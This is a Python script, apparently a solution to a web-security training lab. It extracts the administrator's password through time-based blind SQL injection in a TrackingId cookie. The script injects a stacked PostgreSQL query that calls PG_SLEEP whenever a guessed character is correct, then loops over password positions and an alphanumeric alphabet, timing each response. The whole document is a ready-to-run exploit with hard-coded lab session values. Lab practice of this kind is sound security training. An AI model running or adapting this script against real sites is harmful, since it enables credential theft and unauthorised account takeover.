#!/usr/bin/env python3
from pwn import log
import requests

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
url = "https://acf51fc81e713fb080bf4809007a006b.web-security-academy.net/login"

sess = requests.Session()
password = ""

p1 = log.progress("Password")
p2 = log.progress("Checking")

for p in range(20):
    for s in alphabet:
        r = sess.get(url, cookies = {"TrackingId": "'%3B+SELECT+CASE+WHEN+(username+=+'administrator'+AND+SUBSTR(password,+" + str(p + 1) + ",+1) = '" + s + "')+THEN+PG_SLEEP(5)+ELSE+PG_SLEEP(0)+END+FROM+users--", "session": "ZAz8aobvMIyhIrlM3vSWEdypFJBizEOV"})
        p2.status("position: " + str(p + 1)+ " | symbol: " + str(s) + " | time elapsed: " + str(r.elapsed.total_seconds()))
        if r.elapsed.total_seconds() > 5:
            password += s
            break
    p1.status(password)
p1.success(password)